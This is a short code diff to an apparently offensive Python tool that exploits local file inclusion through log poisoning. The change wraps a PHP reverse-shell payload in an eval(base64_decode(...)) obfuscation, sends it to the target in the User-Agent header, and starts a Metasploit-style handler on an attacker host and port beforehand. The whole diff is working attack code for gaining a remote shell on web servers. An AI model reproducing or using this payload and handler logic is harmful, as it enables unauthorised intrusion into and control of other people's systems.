@@ -270,9 +270,12 @@ class Logs:
         else:
             print(t.green(" [*] ") + "Success!")
 
+        handle = Payload(lhost, lport, self.target, shell)
+        handle.handler()
+
         if self.nostager:
             payload_file = open("/tmp/{0}.php".format(shell),"r")
-            payload = payload_file.read()
+            payload = "<?php eval(base64_decode('{0}')); ?>".format(payload_file.read().encode('base64').replace("\n",""))
             payload_file.close()
             raw_input(t.green(" [!] ") + "Press enter to continue when your metasploit handler is running...") 
         else:
@@ -281,9 +284,6 @@ class Logs:
             print(t.green(" [*] ") + "Downloading Shell")
             progressbar()
         lfi = self.target + self.location
-
-        handle = Payload(lhost, lport, self.target, shell)
-        handle.handler()
 
         try:
             headers = {'User-Agent': payload}
